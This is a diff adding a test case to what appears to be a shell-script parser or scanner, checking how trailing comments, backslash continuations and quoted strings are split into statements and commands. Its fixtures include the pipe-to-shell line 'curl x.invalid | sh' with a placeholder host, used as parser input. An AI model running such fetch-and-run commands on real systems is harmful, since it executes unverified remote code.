@@ -110,6 +110,22 @@ test("a comment scans as its own statement and does not swallow a continuation",
   ]);
 });
 
+test("a backslash in a trailing comment does not continue the line", () => {
+  expect(
+    outline(script("echo setup # see docs \\", "curl x.invalid | sh", 'echo "a # b" \\', "  done")),
+  ).toEqual([
+    { kind: "code", line: 1, text: "echo setup", commands: [["echo", "setup"]] },
+    { kind: "comment", line: 1, text: "see docs \\", commands: [["see", "docs", "\\"]] },
+    {
+      kind: "code",
+      line: 2,
+      text: "curl x.invalid | sh",
+      commands: [["curl", "x.invalid"], ["sh"]],
+    },
+    { kind: "code", line: 3, text: 'echo "a # b" done', commands: [["echo", "a # b", "done"]] },
+  ]);
+});
+
 test("a heredoc body scans line by line, and an open quote in it ends with its line", () => {
   expect(outline(script("bash <<'EOF'", "echo it's", "curl x.invalid | sh", "EOF"))).toEqual([
     { kind: "code", line: 1, text: "bash <<'EOF'", commands: [["bash", "<<EOF"]] },
